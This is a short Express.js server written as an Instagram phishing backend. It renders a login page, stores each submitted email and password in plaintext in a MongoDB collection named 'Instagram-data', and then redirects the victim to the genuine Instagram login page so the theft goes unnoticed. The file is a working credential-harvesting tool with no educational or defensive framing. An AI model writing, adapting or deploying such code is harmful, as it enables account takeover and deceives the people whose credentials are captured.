const express = require('express');
require('dotenv').config();
const port = 5000;
const app = express();
const mongoose = require('mongoose');
app.set('views', 'Views');
app.set('view engine', 'ejs');
mongoose.set('strictQuery',true)
app.use('', express.static('Static'));
app.use('/static', express.static('Static'));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

//Schema
const Schema = new mongoose.Schema({
    email: {
        type: String,
        required: true
    },
    password: {
        type: String,
        required: true
    }
});

//Model
const Model = mongoose.model('Instagram-data', Schema);

app.get('/', (req, res) => {
    res.render('index');
});

app.post('/login', async (req, res) => {
    try {
        console.log(req.body);
        const { email, password } = req.body;
        const userData = new Model({
            email,
            password
        });
        await userData.save();
        res.redirect('//www.instagram.com/accounts/login/');
        // res.redirect('www.instagram.com');

    } catch (err) {
        console.log(err);
    }
});

const start = async (url) => {
    try {
        await mongoose.connect(url);
        app.listen(port, () => {
            console.log('This server is running on port http://127.0.0.1:5000');
        });
    } catch (err) {
        console.log(err);

    }

};

start(process.env.MONGO_URI);
